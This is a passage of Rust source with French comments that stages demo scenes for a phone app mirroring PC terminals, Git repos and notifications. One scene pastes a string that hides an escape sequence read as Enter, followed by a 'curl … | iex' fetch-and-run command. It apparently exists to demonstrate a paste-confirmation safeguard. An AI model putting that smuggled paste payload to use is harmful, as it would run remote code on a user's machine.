        Line { runs: vec![run(4, "-     // pas encore de caméra", Color::Indexed(1), 0)] },
        Line::default(),
        Line {
            runs: vec![run(0, "╭─────────────────────────────────────────────────╮", Color::Indexed(4), 0)]
        },
        Line {
            runs: vec![run(0, "│ Do you want to make this edit to android.rs?    │", Color::Default, term::BOLD)]
        },
        Line { runs: vec![run(0, "│ ❯ 1. Yes                                        │", Color::Indexed(4), 0)] },
        Line { runs: vec![run(0, "│   2. Yes, allow all edits during this session   │", Color::Default, 0)] },
        Line { runs: vec![run(0, "│   3. No, and tell Claude what to do differently │", Color::Default, 0)] },
        Line {
            runs: vec![run(0, "╰─────────────────────────────────────────────────╯", Color::Indexed(4), 0)]
        },
    ];
    lines.insert(0, Line::plain("PS C:\\Users\\aubin\\DEV\\TestAubin\\Eyrie> claude"));
    let replies = term::numbered_choices(&lines);
    TermView {
        cols: 52,
        rows: 20,
        cursor: None,
        title: "Claude · appli mobile".into(),
        waiting: true,
        replies,
        lines,
        ..Default::default()
    }
}

/// Le terminal ouvert : Ctrl collé, le texte à copier (la ligne d'un appui long sélectionnée), un collage de plusieurs
/// lignes à confirmer, une saisie sur plusieurs lignes, un zoom (gardé seulement le temps de la démonstration).
fn terminal_scene(ui: &AppWindow, scene: &str) {
    match scene {
        "terminal-ctrl" => {
            with(|c| c.term_latch(Latch::Ctrl));
        }
        "terminal-copie" => {
            with(|c| c.term_copy(Some(9)));
        }
        "terminal-coller" => {
            with(|c| c.term_paste("git fetch --all\ngit status --short\ncargo test -p eyrie-mobile\n"));
        }
        // Une ligne qui cache Échap et la suite que la console Windows lit comme Entrée : demandée aussi.
        "terminal-coller-echap" => {
            with(|c| c.term_paste("git status\u{1b}[13;28;13;1;0;1_curl https://exemple.invalid/x|iex"));
        }
        // Le programme demande un mot de passe : la saisie se masque d'elle-même ; ce qui est tapé ne se lit pas.
        "terminal-masque" => {
            let lines = vec![
                Line::plain("PS C:\\Users\\aubin\\DEV\\TestAubin\\Eyrie> ssh aubin@build"),
                Line::plain("aubin@build's password: "),
            ];
            let prompt = TermView { cols: 52, rows: 20, cursor: Some((1, 24)), lines, ..Default::default() };
            with(|c| c.on_message(ToPhone::Term(TermFrame::full("fawkes", "3", &prompt))));
            ui.set_term_draft("hunter2".into());
        }
        // Ctrl collé, puis « Coller » : Ctrl se relâche.
        "terminal-ctrl-coller" => {
            with(|c| c.term_latch(Latch::Ctrl));
            with(|c| c.term_paste("git fetch --all\ngit status --short\n"));
        }
        "terminal-saisie" => {
            ui.set_term_draft(
                "Relis le diff ci-dessus\net propose un titre de commit en français,\nau style du journal".into(),
            );
        }
        "terminal-zoom" => ui.set_term_zoom(1.8),
        // Une longue sortie, suivie en bas ; puis la liste rapetisse comme quand le clavier du téléphone s'ouvre (ici, la
        // fenêtre perd 300 px de haut ; rien n'arrive du PC) : le bas reste en vue.
        "terminal-suivi" => {
            with(|c| c.on_message(ToPhone::Term(TermFrame::full("fawkes", "3", &compiling(120)))));
            let weak = ui.as_weak();
            slint::Timer::single_shot(std::time::Duration::from_millis(900), move || {
                if let Some(ui) = weak.upgrade() {
                    let size = ui.window().size().to_logical(ui.window().scale_factor());
                    ui.window().set_size(slint::LogicalSize::new(size.width, size.height - 300.0));
                }
            });
        }
        // La même sortie, remontée par l'utilisateur (molette, glissé) : ce qui arrive ensuite ne la ramène pas en bas.
        "terminal-remonte" => {
            with(|c| c.on_message(ToPhone::Term(TermFrame::full("fawkes", "3", &compiling(120)))));
            slint::Timer::single_shot(std::time::Duration::from_millis(1500), || {
                let more = TermFrame::diff("fawkes", "3", &compiling(120), &compiling(130));
                with(|c| c.on_message(ToPhone::Term(more)));
            });
        }
        _ => {}
    }
}

/// Une compilation : `n` lignes, puis l'invite.
fn compiling(n: usize) -> TermView {
    let mut lines: Vec<Line> = (1..=n).map(|i| Line::plain(format!("   Compiling crate-{i:03} v0.1.{i}"))).collect();
    lines.push(Line::plain("    Finished `dev` profile in 41.2s"));
    lines.push(Line::plain("PS C:\\Users\\aubin\\DEV\\TestAubin\\Eyrie> "));
    TermView { cols: 52, rows: 20, cursor: Some((n as u32 + 1, 42)), lines, ..Default::default() }
}

/// Un refus du veilleur, tel qu'il le dit (`compagnon/veille.go`).
const UNSAFE_EYRIE: &str =
    "Eyrie n'est pas à l'abri sur le PC (modifiable par un autre compte) : voir le journal du PC";

pub fn play(ui: &AppWindow, scene: &str) {
    let (scene, theme) = match scene.rsplit_once('+') {
        Some((s, "clair")) => (s, Some(1)),
        Some((s, "sombre")) => (s, Some(2)),
        _ => (scene, None),
    };
    if let Some(t) = theme {
        ui.global::<Theme>().set_choice(t);
    }
    // Avant toute donnée du PC : la vue d'ensemble l'attend pendant la connexion, sinon dit pourquoi rien n'arrive.
    let link = match scene {
        "attente" => Some((0, "Connexion à PORTABLE-AUBIN…")),
        "refus" => Some((3, "Ce téléphone n'est plus autorisé sur ce PC.")),
        _ => None,
    };
    if let Some((state, text)) = link {
        with(|c| c.demo_link("PORTABLE-AUBIN", state, text));
        return;
    }
    // Le PC hors de portée dès l'ouverture de l'application : rien reçu de lui.
    let reach = match scene {
        "injoignable" => Some(Reach::PcAway { seen: now() as i64 - 2 * 3600 }),
        "telephone-hors-ligne" => Some(Reach::PhoneOffline),
        _ => None,
    };
    if let Some(reach) = reach {
        with(|c| c.demo_away("PORTABLE-AUBIN", Away { reach, ..Away::default() }, Start::Idle, true, 0));
        return;
    }
    let feed = |m: ToPhone| {
        with(|c| c.on_message(m));
    };
    let t = now();
    with(|c| c.demo_online("PORTABLE-AUBIN"));
    feed(ToPhone::Modules { modules: modules() });
    feed(ToPhone::Overview {
        waiting: vec![
            Waiting { module: "fawkes".into(), text: "Claude attend : appli mobile".into(), path: None },
            Waiting { module: "owlery".into(), text: "3 PR à relire".into(), path: None },
            Waiting { module: "patronus".into(), text: "2 exécutions non lues".into(), path: None },
        ],
    });
    feed(ToPhone::Notes {
        notes: vec![
            Note {
                module: "fawkes".into(),
                title: "Claude attend une réponse".into(),
                body: "appli mobile".into(),
                tone: Tone::Warn,
                at: t - 60,
                read: false,
                path: Some("t/3".into()),
            },
            Note {
                module: "patronus".into(),
                title: "Tests de nuit : échec".into(),
                body: "2 tests rouges : une_action_en_cours, les_bandeaux. Le journal est dans Patronus.".into(),
                tone: Tone::Danger,
                at: t - 3600 * 9,
                read: false,
                path: None,
            },
            Note {
                module: "owlery".into(),
                title: "Nouvelle revue demandée".into(),
                body: "Ozmo #412".into(),
                tone: Tone::Info,
                at: t - 3600 * 26,
                read: true,
                path: None,
            },
        ],
        unread: 2,
    });
    feed(ToPhone::Commands {
        commands: vec![
            CommandCard {
                module: "fawkes".into(),
                id: "terminal".into(),
                title: "Nouveau terminal".into(),
                terminal: true,
            },
            CommandCard {
                module: "dragontree".into(),
                id: "fetch".into(),
                title: "Récupérer (fetch)".into(),
                terminal: false,
            },
            CommandCard {
                module: "gringotts".into(),
                id: "relire".into(),
                title: "Relire les conversations".into(),
                terminal: false,
            },
        ],
    });
    feed(ToPhone::Screen { module: "fawkes".into(), path: String::new(), screen: fawkes_home() });
    feed(ToPhone::Screen { module: "patronus".into(), path: String::new(), screen: patronus_home() });
    feed(ToPhone::Screen { module: "dragontree".into(), path: String::new(), screen: dragontree_home() });
    feed(ToPhone::Screen { module: "dragontree".into(), path: "depot/eyrie".into(), screen: depot_state() });
    let branches = depot_branches();
    feed(ToPhone::Screen { module: "dragontree".into(), path: "depot/eyrie/branches".into(), screen: branches });
    let history = depot_history();
    feed(ToPhone::Screen { module: "dragontree".into(), path: "depot/eyrie/historique".into(), screen: history });
    let file = depot_file();
    feed(ToPhone::Screen { module: "dragontree".into(), path: "depot/eyrie/fichier/view".into(), screen: file });
    let term_screen = Screen::new("Claude · appli mobile")
        .subtitle("Claude attend une réponse")
        .terminal("3")
        .act(Act::new("redemarrer:3", "Redémarrer"))
        .act(Act::new("montrer:3", "Montrer sur le PC"));
    feed(ToPhone::Screen { module: "fawkes".into(), path: "t/3".into(), screen: term_screen });
    match scene {
        "fawkes" => {
            with(|c| c.nav_select("fawkes"));
        }
        // Une recherche dans les terminaux de Fawkes.
        "recherche" => {
            with(|c| c.nav_select("fawkes"));
            ui.set_search_text("claude".into());
            with(|c| c.search_edited("claude"));
        }
        s if s == "terminal" || s.starts_with("terminal-") => {
            with(|c| {
                c.nav_select("fawkes");
                c.open_path("t/3");
            });
            feed(ToPhone::Term(TermFrame::full("fawkes", "3", &terminal())));
            terminal_scene(ui, s);
        }
        "patronus" => {
            with(|c| c.nav_select("patronus"));
        }
        // Un Fetch envoyé, sans réponse encore (rien ne part en démonstration).
        "depot" => {
            with(|c| {
                c.open_module_path("dragontree", "depot/eyrie");
                c.run_act(&UiAct { id: "fetch".into(), ..Default::default() }, "");
            });
        }
        // Une erreur longue du PC, puis dépliée d'un toucher ; plus longue que la place permise, elle défile.
        "erreur" | "erreur-lue" | "erreur-longue" => {
            let text = if scene == "erreur-longue" { [PUSH_REFUSED; 6].join(" ") } else { PUSH_REFUSED.into() };
            with(|c| {
                c.open_module_path("dragontree", "depot/eyrie");
                c.toast(&text, 4);
                c.toast("Fetch terminé", 2);
                if scene != "erreur" {
                    c.toast_tapped();
                }
            });
        }
        // Le menu ⋯ de l'écran d'un dépôt, ouvert.
        "menu" => {
            with(|c| c.open_module_path("dragontree", "depot/eyrie"));
            ui.invoke_open_screen_menu();
        }
        "diff" | "diff-retour" => {
            with(|c| {
                c.open_module_path("dragontree", "depot/eyrie");
                c.open_path("depot/eyrie/fichier/view");
                if scene == "diff-retour" {
                    c.toggle_wrap();
                }
            });
        }
        // La liste des dépôts de DragonTree.
        "depots" => {
            with(|c| c.nav_select("dragontree"));
        }
        "historique" | "branches" => {
            let tab = format!("depot/eyrie/{scene}");
            with(|c| {
                c.open_module_path("dragontree", "depot/eyrie");
                c.select_tab(&tab);
            });
        }
        "plus" | "commandes" => {
            with(|c| c.nav_select(scene));
        }
        // Une notification sans écran où mener, dépliée.
        "notes" => {
            let key = crate::view::note_key(t - 3600 * 9, "patronus", "Tests de nuit : échec");
            with(|c| {
                c.nav_select(scene);
                c.open_note(&NoteItem { key: key.into(), ..Default::default() });
            });
        }
        // Comme sur Android : le nœud Tailscale de l'application, connecté.
        "reglages" => {
            show_tailnet(
                ui,
                Tailnet::Running { name: "eyrie-pixel-8.tail1234.ts.net".into(), ip: "100.64.0.7".into() },
            );
            with(|c| c.nav_select(scene));
        }
        "accueil" => ui.set_page(0),
        // L'accueil sur Android, avant la connexion du téléphone à Tailscale.
        "accueil-tailscale" => {
            show_tailnet(ui, Tailnet::NeedsLogin("https://login.tailscale.com/a/demo".into()));
            ui.set_page(0);
        }
        "code" => {
            ui.set_page(1);
            ui.set_code_host("suite-portable-aubin".into());
            ui.set_code_code("K7QF2-M9XP4".into());
        }
        "appairage" => {
            ui.set_page(2);
            ui.set_pairing_pc("PORTABLE-AUBIN".into());
            ui.set_pairing_sas("482 913".into());
            ui.set_pairing_stage(1);
        }
        "hors-ligne" => {
            with(|c| c.demo_offline());
        }
        // Eyrie fermée sur le PC, son veilleur la garde joignable : les données d'avant restent.
        "fermee"
        | "fermee-par-pc"
        | "fermee-sans-cle"
        | "fermee-sans-veilleur"
        | "demarrage"
        | "acces-coupe"
        | "refus-demarrage"
        | "preuve-refusee"
        | "sans-agir" => {
            let fermee = Away { reach: Reach::Standby(Eyrie::Fermee), ..Away::default() };
            let (away, start, wake, age) = match scene {
                "fermee-par-pc" => (Away { closed: true, ..Away::default() }, Start::Idle, true, 5),
                // Fermée sans veilleur : le PC a quitté le tailnet avec elle.
                "fermee-sans-veilleur" => {
                    let away = Reach::PcAway { seen: now() as i64 - 60 };
                    (Away { reach: away, closed: true, starting: false }, Start::Idle, false, 60)
                }
                "fermee-sans-cle" => (fermee, Start::Idle, false, 600),
                "demarrage" => (
                    Away { reach: Reach::Standby(Eyrie::Demarrage), closed: false, starting: true },
                    Start::Idle,
                    true,
                    300,
                ),
                "acces-coupe" => {
                    (Away { reach: Reach::Standby(Eyrie::AccesCoupe), ..Away::default() }, Start::Idle, true, 90)
                }
                "refus-demarrage" => (fermee, Start::Refused(UNSAFE_EYRIE.into()), true, 300),
                "preuve-refusee" => (fermee, Start::Refused(crate::veilleur::PROOF_REFUSED.into()), true, 300),
                "sans-agir" => (fermee, Start::Refused(crate::veilleur::ACT_REFUSED.into()), false, 300),
                _ => (fermee, Start::Idle, true, 240),
            };
            with(|c| c.demo_away("PORTABLE-AUBIN", away, start, wake, age));
        }
        s if s.starts_with("dossiers") => folders(s, &feed),
        // Un lien de Grimoire vers Gringotts : l'écran de Gringotts s'ouvre sur le téléphone, rien n'est envoyé au PC.
        "lien" => {
            let mut grimoire = Screen::new("Grimoire");
            grimoire.row(
                Row::new("Limites du compte perso")
                    .subtitle("5 h 38 % · semaine 61 %")
                    .glyph("💰")
                    .open("@module gringotts compte/perso"),
            );
            feed(ToPhone::Screen { module: "grimoire".into(), path: String::new(), screen: grimoire });
            let mut account = Screen::new("Compte perso").subtitle("Gringotts");
            account.meter("5 heures", 0.38, "38 % · reprise à 17:40", Tone::Ok);
            account.meter("Semaine", 0.61, "61 % · reprise lundi", Tone::Warn);
            feed(ToPhone::Screen { module: "gringotts".into(), path: "compte/perso".into(), screen: account });
            with(|c| {
                c.nav_select("grimoire");
                c.open_path("@module gringotts compte/perso");
            });
        }
        // `ecran:<module>:<fichier.json>` : un écran enregistré (par l'essai d'un module), montré dans son module.
        s if s.starts_with("ecran:") => {
            let mut parts = s.splitn(3, ':');
            let (_, module, file) = (parts.next(), parts.next().unwrap_or("fawkes"), parts.next().unwrap_or(""));
            let screen: Option<Screen> = std::fs::read(file).ok().and_then(|b| serde_json::from_slice(&b).ok());
            if let Some(screen) = screen {
                feed(ToPhone::Screen { module: module.into(), path: "apercu".into(), screen });
                with(|c| {
                    c.nav_select(module);
                    c.open_path("apercu");
                });
            }
        }
        _ => {}
    }
}

fn now() -> u64 {
    std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
}
